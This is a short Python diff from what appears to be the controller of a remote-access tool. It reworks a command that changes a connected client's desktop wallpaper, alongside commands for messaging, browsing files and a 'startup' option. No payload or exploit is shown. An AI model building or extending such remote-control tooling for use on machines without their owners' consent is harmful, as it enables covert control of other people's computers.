@@ -266,10 +266,12 @@ def browse_files():
 
     print(f"\n{strClientResponse}")
 
-def setWallpaper(url):
-    send(("wallpaper" + url).encode())
-    intBuffer = int(recv(intBuff).decode())  # receive buffer size
-    print(recv(intBuffer))
+# def setWallpaper(url):
+#     print("[DEBUG] - " + "wallpaper " + url)
+
+#     send(("wallpaper " + url).encode())
+#     intBuffer = int(recv(intBuff).decode())  # receive buffer size
+#     print(recv(intBuffer))
 
 
 def startup():
@@ -462,8 +464,9 @@ def send_commands():
             elif strChoice[:1] == "m" and len(strChoice) > 1:
                 strMsg = "msg" + strChoice[2:]
                 send(strMsg.encode())
-            elif strChoice == "w":
-                setWallpaper("https://ftopx.com/pic/1920x1080/202112/61caa0db2adf0.jpg")
+            elif strChoice[:1] == "w" and len(strChoice) > 1: # TODO: == 2?
+                strMsg = "wallpaper" + strChoice[2:]
+                send(strMsg.encode())
             elif strChoice == "a 1":
                 startup()
             elif strChoice == "a 2":
